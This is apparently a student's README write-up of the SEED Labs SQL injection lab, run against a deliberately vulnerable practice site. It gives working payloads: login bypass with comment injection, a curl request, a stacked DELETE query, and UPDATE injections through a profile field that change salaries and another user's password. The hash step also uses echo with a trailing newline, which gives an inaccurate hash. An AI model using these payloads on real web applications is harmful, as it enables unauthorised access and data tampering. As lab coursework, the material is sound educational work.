# Seed-Lab-Sql-Injection-Attack
SQL injection attack

|  Name   | Title |
| ------------- | ------------- |
| Asad Ali  | Seed Lab SQL Injection  |

Instruction: https://seedsecuritylabs.org/Labs_16.04/PDF/Web_SQL_Injection.pdf

# Task 1
### Login to MYSQL
```
sudo mysql -u root -pseedubuntu
```
![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/mysql%20query.PNG)
### Use Users Database from Databases
```
mysql> use Users;
```
![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/use%20users.PNG)
## Showing Tables from Users Database
```
mysql> show Tables;
```
![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/show%20table.PNG)
## Select Name="Alice" from Users Database
```
mysql> select * from credential where Name = 'Alice';
```
![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/select%20query.PNG)
# Task 2
## Task2.1
- Username ```"Admin'#"```
- Password ```"abc"```
It will result in a SQL query as:
```
SELECT id, name, eid, salary, birth, ssn, address, email,
nickname, Password
FROM credential
WHERE name= 'Admin' #' and Password='abc'
```
Then statements after ```#``` will be regarded as comments. So we can log in as ```Admin```.

![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/users%20details.PNG)
## Task 2.2
```
curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23Password=xyz'
```
![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/curl%20url.PNG)
## Task 2.3

Now we use SQL query to update data using same vulnerability
```
'1=1; DELETE from credential where name='Alice';
```
So 
- USERNAME : ```'1=1; DELETE from credential where name='Alice';```
- PASSWORD : ```""```
 
 As result
 
![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/task%202.3%20use%20delete%20query.PNG)

Because in PHP's ```mysqli``` extension, which invokes ```mysqli::query``` API to handle SQL statements, it doesn't support for multiple queries within the same run. Of course, the design of this API attributes to the concern of SQL injection.

# Task 3
It's hard to find the navigation buttons on this website (www.SeedLabSQLInjection.com).
In order to edit the profile, please log in and then jump to the link address: http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php by hand.

## Task 3.1

Log in with Alice's 
- USERNAME : ```"Alice'#"```
- PASSWORD : ```""```

![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/alice%20profile.PNG)

 Than enter http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php 
 
 Than Modify Phone Number as ```', Salary=1000000 #``` and save.
 
 ![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/modify%20alice%20number.PNG)
 
## Task 3.2

Log in with Boby 
- USERNAME : ```"Boby'#"```
- PASSWORD : ```""```

![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/Boby%20profile.PNG)

 Than enter http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php 
 
 Than Modify Phone Number as ```', Salary=0 #``` and save.
 
 ![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/salary%20of%20boby%20change.PNG)
 
## Task 3.3

The simplest approach is to log-in as Alice like Task 3.1 and change the password.
Log in with Boby 
- USERNAME : ```"Alice'#"```
- PASSWORD : ```""```

 Than enter http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php 
 
 Assume we want to change Alice's password as ```12345```. First, we should get SHA1 value of our new password via Terminal using Command
 
 ```echo "12345"|sha1sum```
  ![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/hash%20pass.PNG)
  
 So our SHA1 code is 
 
 ```2672275fe0c456fb671e4f417fb2f9892c7573ba```
 
 Than Modify Phone Number as ```', password='2672275fe0c456fb671e4f417fb2f9892c7573ba' where name='Alice' #``` and save.
 
 ![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/Alice%20pass%20update.PNG)
 
 now you login to Alice
 - USERNAME : ```Alice```
 - PASSWORD : ```12345```
 
